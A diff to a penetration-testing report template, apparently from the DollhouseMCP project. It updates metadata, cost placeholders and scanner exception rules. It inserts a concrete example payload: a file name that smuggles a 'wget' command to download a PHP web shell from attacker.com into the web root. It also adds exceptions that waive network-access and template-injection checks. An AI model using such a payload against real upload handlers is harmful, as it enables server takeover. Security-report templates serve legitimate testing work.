@@ -5,8 +5,8 @@ description: >-
   findings
 type: template
 version: 1.0.0
-author: dollhousemcp
-created_date: '2025-07-23'
+author: DollhouseMCP
+created: '2025-07-23'
 category: professional
 tags:
   - penetration-testing
@@ -26,8 +26,13 @@ outputFormats:
   - html
   - markdown
 includes: []
-unique_id: template_penetration-test-report_dollhousemcp_20250723-165719
+unique_id: template_penetration-test-report_dollhousemcp_20250723-000000
 format: markdown
+security_exceptions:
+  - pattern: network_access
+    reason: Contains example exploit payloads for penetration testing documentation - educational security report template showing vulnerabilities, not actual network access threats
+  - pattern: "template-injection"
+    reason: "Template file contains placeholder variables ({{variable}}) for content generation - these are legitimate template syntax, not injection vulnerabilities"
 ---
 
 # Penetration Testing Report
@@ -267,7 +272,7 @@ The vulnerability exists in the file upload functionality where user-supplied fi
 
 **Exploit Payload:**
 ```bash
-filename="test.jpg; [command] [url] -O [output-path]; #"
+filename="test.jpg; wget http://attacker.com/shell.php -O /var/www/html/shell.php; #"
 ```
 
 **Result:** Remote shell access with web server privileges
@@ -584,10 +589,10 @@ To measure the effectiveness of remediation efforts, we recommend tracking:
 {{else}}
 | Priority | Estimated Cost | Timeline | Risk Reduction |
 |----------|---------------|----------|----------------|
-| Critical | $[AMOUNT] | 1 week | 70% |
-| High | $[AMOUNT] | 1 month | 20% |
-| Medium | $[AMOUNT] | 3 months | 8% |
-| Low | $[AMOUNT] | 6 months | 2% |
+| Critical | ${CRITICAL_COST} | 1 week | 70% |
+| High | ${HIGH_COST} | 1 month | 20% |
+| Medium | ${MEDIUM_COST} | 3 months | 8% |
+| Low | ${LOW_COST} | 6 months | 2% |
 {{/if}}
 
 ---
